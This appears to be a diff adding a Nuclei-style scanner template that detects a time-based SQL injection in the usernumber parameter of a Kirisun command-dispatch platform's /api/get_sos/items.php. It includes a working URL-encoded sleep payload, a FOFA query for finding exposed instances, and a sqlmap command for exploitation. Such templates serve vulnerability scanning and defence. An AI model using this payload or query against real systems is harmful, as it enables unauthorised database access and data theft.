@@ -1,0 +1,34 @@
+id: kirisun-items-sqli
+
+info:
+  name: 福建科立讯通信有限公司指挥调度管理平台 /api/get_sos/items.php - sqli
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="app/structure/departments.php" ||app="指挥调度管理平台"
+    sqlmap: sqlmap -r sqli.txt --tamper=space2comment --batch --random-agent --dbms=mysql
+    tips: usernumber is injection
+  tags: kirisun,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /api/get_sos/items.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Content-Type: application/x-www-form-urlencoded
+        
+        sign=7a6f931dde8e8aafbbfa4d2bcab475e6&timestamp=1686020152221&usernumber=1%27and%28select%2Afrom%28select%2Bsleep%286%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'user not found')
+          - duration >= 5 && duration < 9
+        condition: and
